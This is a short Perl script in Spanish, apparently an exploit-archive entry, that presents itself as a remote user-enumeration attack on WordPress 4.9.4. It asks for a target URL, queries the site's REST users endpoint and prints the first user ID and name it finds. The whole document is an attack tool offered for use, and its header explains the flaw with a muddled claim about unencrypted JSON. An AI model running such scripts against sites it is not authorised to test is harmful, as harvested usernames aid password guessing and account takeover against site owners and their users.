#!/usr/bin/perl
#####################################################
# Titulo :Enumeración de usuario en Wordpress 4.9.4 
# Author : kiz4ru
# Vendedor : https://wordpress.org/
# Software Link: https://wordpress.org/download/
# Version : 4.9.4
# Fecha : 17 Feb 2018
# Testeado en : Ubuntu / Windows 10
# Escribir : Remote
#####################################################

# Descripción :
# En Wordpress 4.9.4 podemos encontrar todos los usuarios de la web
# Dirección: wp-json/wp/v2/users/
# La razón de esta vulnerabilidad es que wordpress no encripta el json source.
# Comando : perl user.pl


use LWP::UserAgent;


my $ua = LWP::UserAgent->new;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print <<logo;
 _ _ _           _                     
| | | |___ ___ _| |___ ___ ___ ___ ___ 
| | | | . |  _| . | . |  _| -_|_ -|_ -|
|_____|___|_| |___|  _|_| |___|___|___|
                  |_|                  
logo

print "\n[-] Wordpress 4.9.4 Enumeracion de Usuario";

print "\nEnter Target URL : ";
my $url=<>;
chomp($url);

my $target = "$url/wp-json/wp/v2/users/";
my $content = $ua->get("$target")->content;
if ($content =~ /"id":(.*?),/)
{
print "\nID : $1\n";
}


if ($content =~ /"name":"(.*?)",/)
{
print "\nUsuario : $1\n";
}
